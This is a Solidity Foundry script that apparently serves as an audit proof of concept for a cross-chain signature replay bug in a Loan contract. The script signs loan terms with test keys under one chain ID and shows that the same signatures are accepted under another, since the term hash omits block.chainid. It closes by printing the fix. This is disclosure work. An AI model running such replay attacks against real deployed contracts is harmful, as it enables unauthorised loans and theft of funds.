// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Loan} from "../contracts/Loan/Loan.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockLoanTokenCCR is ERC20 {
    constructor() ERC20("MockLoanToken", "MLT") {
        _mint(msg.sender, 1_000_000);
    }
}

contract PocLoanCrossChainReplay is Script {
    uint256 constant LENDER_KEY   = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant BORROWER_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    uint32  constant RATE      = 10;
    uint32  constant RATE_BASE = 100;
    uint256 constant PRINCIPAL = 1_000;

    function run() external {
        address lender   = vm.addr(LENDER_KEY);
        address borrower = vm.addr(BORROWER_KEY);
        uint256 maturity = 30 days;
        uint256 repayDl  = block.timestamp + 3650 days;

        vm.startBroadcast(LENDER_KEY);

        MockLoanTokenCCR token = new MockLoanTokenCCR();
        Loan loan = new Loan(address(token));
        token.approve(address(loan), type(uint256).max);

        vm.stopBroadcast();

        console.log("[deploy] MockLoanToken:", address(token));
        console.log("[deploy] Loan:         ", address(loan));
        console.log("");

        // ── Step 1: produce loan term hash and signatures (simulating Chain A) ─
        // On a live multi-chain deployment, chainId=2370 (Creditcoin) would be real.
        // vm.chainId() lets us show chainId has ZERO effect on the hash.
        uint256 chainA = 2370;
        uint256 chainB = 11155111;

        vm.chainId(chainA);
        bytes32 hashChainA = loan.predictLoanTermHash(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl);
        bytes32 msgHash    = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hashChainA));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_KEY,   msgHash);
        bytes memory lenderSig  = abi.encodePacked(r, s, v);
        (v, r, s)               = vm.sign(BORROWER_KEY, msgHash);
        bytes memory borrowerSig = abi.encodePacked(r, s, v);

        console.log("=== CHAIN A (chainId=2370) ===");
        console.log("[sign] Signatures produced on chain A");

        // ── Step 2: switch to Chain B, verify hash is unchanged ───────────────
        vm.chainId(chainB);
        bytes32 hashChainB = loan.predictLoanTermHash(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl);

        console.log("");
        console.log("=== CHAIN B (chainId=11155111) REPLAY ===");
        console.log("[check] hash A == hash B:", hashChainA == hashChainB);

        require(hashChainA == hashChainB, "Expected identical hashes");

        // ── Step 3: createLoanTerm succeeds with chain-A signatures on chain B ─
        vm.broadcast(LENDER_KEY);
        bytes32 createdHash = loan.createLoanTerm(
            lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl,
            lenderSig, borrowerSig
        );

        console.log("[replay] createLoanTerm() accepted chain-A signatures on chain B");
        console.log("[replay] created loanHash:", uint256(createdHash));
        console.log("");
        console.log("=== ATTACK CONFIRMED ===");
        console.log("Signatures signed on chainId=2370 accepted on chainId=11155111.");
        console.log("predictLoanTermHash() uses address(this) but NOT block.chainid.");
        console.log("Same contract address across chains (CREATE2) = full replay attack.");
        console.log("Fix: include block.chainid in the hash or use EIP-712 domain separator.");
    }
}
